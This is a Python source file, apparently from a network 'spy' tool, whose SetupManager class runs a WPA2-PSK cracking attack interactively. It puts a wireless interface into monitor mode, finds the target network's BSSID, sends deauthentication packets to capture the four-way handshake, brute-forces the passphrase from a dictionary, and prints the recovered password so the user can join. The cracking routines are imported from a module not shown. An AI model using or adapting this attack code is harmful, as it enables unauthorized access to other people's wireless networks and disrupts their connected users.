from scapy.all import *
from scapy.layers.inet import IP, ICMP, Ether
from preSpy.WPA2Cracker import *
from getmac import get_mac_address as getMac
import netifaces as ni


class SetupManager:
    def __init__(self, pingDomain = "google.com", connectionTimeOut = 3):
        self.interface = None
        self.connected = False
        self.stop = False
        self.pingDomain = pingDomain
        self.connectionTimeout = connectionTimeOut
        self.interfaceIP = None
        self.interfaceMac = None
    def nextInterface(self):
        interface = input("Please Enter An Interface To Run The Spy On.\t")
        while interface != "stop" and not self.isAccessible(interface):
            interface = input("Invalid Interface, Try Again.\t")
        if interface == "stop":
            self.stop = True
            return
        self.interface = interface

    def wpaAttack(self):
        ans = input("Would You Like To Perform A BruteForce Attack On A WPA2-PSK AccessPoint?[Y][N]\t")
        while ans not in ["y","n","Y","N"]:
            if ans == "stop":
                self.stop = True
                return
            ans = input("InValid Answer, Try Again.\t")
        if ans in ["n", "N"]:
            return

        path = input("Please Enter The Path To The Dictionary You Want To BruteForce With.\t")
        while not self.fileExists(path):
            if path == "stop":
                self.stop = True
                return
            path = input("InValid Path, Try Again.\t")

        ssid = input("Please Enter The SSID Of The Access Point You Want To Hack Into To(SSID = Network's Name).\t")
        wpa2Cracker = WPA2Cracker(self.interface, ssid, path)
        print("Entering Monitor Mode...\t")
        wpa2Cracker.setMonitorMode()
        if wpa2Cracker.attackFailed:
            print("Attack Failed, Interface Couldn't Enter Monitor Mode.\t")
            return

        print("Sniffing For Beacons...\t")
        wpa2Cracker.findBssid()
        while wpa2Cracker.attackFailed:
            print("Couldn't Find BSSID, If You Want To Try Again Please Enter A New SSID Or Re-Enter The Original One.\t")
            ssid = input("If You Wish To Abort The Attack Enter: 'abort'\t")
            if ssid == "stop":
                wpa2Cracker.setManagedMode()
                self.stop = True
                return
            elif ssid == "abort":
                wpa2Cracker.setManagedMode()
                return
            wpa2Cracker.bssidFinder.ssid = ssid
            wpa2Cracker.attackFailed = False
            print("Sniffing For Beacons...\t")
            wpa2Cracker.findBssid()

        print("BSSID Found!\t")

        print("Sending DeAuth Packets And Sniffing For Handshake...\t")
        wpa2Cracker.getHandshake()
        if wpa2Cracker.attackFailed:
            print("Attack Failed, Couldn't Capture 4 Way Handshake.\t")
            return
        print("Handshake Found!\t")
        print("Entering Managed Mode...\t")
        wpa2Cracker.setManagedMode()

        print(f"BruteForcing Password Using {path}...\t")
        wpa2Cracker.bruteForceMic()
        while wpa2Cracker.attackFailed:
            path = input("Attack Failed To Find The Password, Please Enter A Different Dictionary Or Enter 'abort'.\t")
            if path == "stop":
                self.stop = True
                return
            elif path == "abort":
                return
            if self.fileExists(path):
                wpa2Cracker.PSKFinder.dictPath = path
                wpa2Cracker.attackFailed = False
                print(f"BruteForcing Password Using {path}...\t")
                wpa2Cracker.bruteForceMic()
            else:
                print("InValid Path, Try Again.\t")

        print(f"SUCCESS!\tThe Password For {ssid} Is:\t{wpa2Cracker.PSKFinder.PSK}\t")
        print("Connect To The Network And Restart The Program.\t")
        self.stop = True

    def isAccessible(self, interface):
        try:
            sendp(Ether(), iface=interface, verbose=False)
            return True
        except Exception as e:
            print(e)
            return False

    def isConnected(self, interface):
        print(f"Checking If {interface} Is Connected To The Internet...\t")
        try:
            pingPacket = Ether() / IP(dst=self.pingDomain) / ICMP(seq=1, id=1)
            ans = srp1(pingPacket, iface=interface, timeout=self.connectionTimeout, verbose=False)
            self.interfaceMac = getMac(self.interface)
            self.interfaceIP = ni.ifaddresses(self.interface)[ni.AF_INET][0]['addr']
            return ans != None
        except Exception as e:
            #print(e)
            return False

    def fileExists(self, path):
        try:
            f = open(path)
            f.close()
            return True
        except Exception as e:
            print(e)
            return False

    def getIfaceIP(self, ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])